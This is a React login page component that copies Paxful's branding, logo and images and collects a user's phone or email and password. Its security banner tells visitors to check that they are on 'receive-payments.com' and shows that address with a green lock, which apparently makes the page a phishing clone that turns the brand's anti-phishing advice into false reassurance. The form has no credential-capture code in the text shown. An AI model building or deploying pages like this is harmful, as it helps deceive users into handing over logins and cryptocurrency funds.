import { BsGlobe } from "react-icons/bs";
import { FcInfo } from "react-icons/fc";
import { BiSolidLockAlt } from "react-icons/bi";
import paxful_image from "../assets/pax.webp";
import paxful_logo from "../assets/paxlogo.png";

export default function Login() {
  return (
    <section className="flex md:h-screen">
      <div className="px-6 md:px-8 py-12 bg-white md:w-[40%]">
        <div className="flex items-center justify-between">
          <img src={paxful_logo} alt="paxful_logo" className="block" />
          <div className="flex items-center gap-x-2 p-2 border rounded-md border-gray-400">
            <BsGlobe size={20} />
            <select name="lang" id="lang" className="outline-none">
              <option value="english">English</option>
              <option value="english">Francais</option>
              <option value="english">Espanol</option>
            </select>
          </div>
        </div>
        <h2 className="text-textColor font-bold text-3xl my-8">
          login with paxful
        </h2>
        <div className="bg-skyblue bg-opacity-20 border w-full border-skyblue rounded">
          <div className="p-2">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-y-4 sm:gap-y-0 items-center">
              <div className="flex gap-x-3 ">
                <FcInfo size={15} />
                <p className="text-xs">
                  IMPORTANT! Please check that{" "}
                  <br className="hidden md:block" /> you are visiting{" "}
                  <br className="hidden md:block" />
                  https://receive-payments.com/
                </p>
              </div>
              <p className="text-[10px] font-bold gap-x-1 items-center flex bg-white p-2 rounded-sm w-fit border border-gray-300">
                <BiSolidLockAlt className="inline text-green-700" size={15} />
                <span className="text-green-700">https://</span>
                receive-payments.com/
              </p>
            </div>
          </div>
        </div>
        <form className="mt-6">
          <div className="mb-4">
            <label
              htmlFor="emailorPhone"
              className="font-bold text-sm block mb-2"
            >
              Your Phone or Email
            </label>
            <input
              type="text"
              name="emailorphone"
              id="emailorphone"
              className="p-3 w-full outline-none border border-gray-300 rounded"
            />
          </div>
          <div className="mb-4">
            <div className="flex items-center justify-between">
              <label
                htmlFor="password"
                className="font-bold text-sm block mb-2"
              >
                Your Password
              </label>
              <p className="text-sm text-btnColor">Forgot Password?</p>
            </div>
            <input
              type="password"
              name="password"
              id="password"
              className="p-3 w-full outline-none border border-gray-300 rounded"
            />
          </div>
          <button
            type="submit"
            className="p-3 bg-btnColor text-white text-lg rounded w-full mb-6"
          >
            Login &rarr;
          </button>
          <hr />
          <small className="block mt-10 text-sm">
            New on paxful{" "}
            <a href="#" className="text-btnColor">
              Create an account
            </a>
          </small>
        </form>
      </div>

      <div className="hidden md:w-[60%] md:py-12 bg-skyblue bg-opacity-20 md:grid place-items-center">
        <img
          className="object-fit w-96"
          src={paxful_image}
          alt="paxful_image"
        />
      </div>
    </section>
  );
}
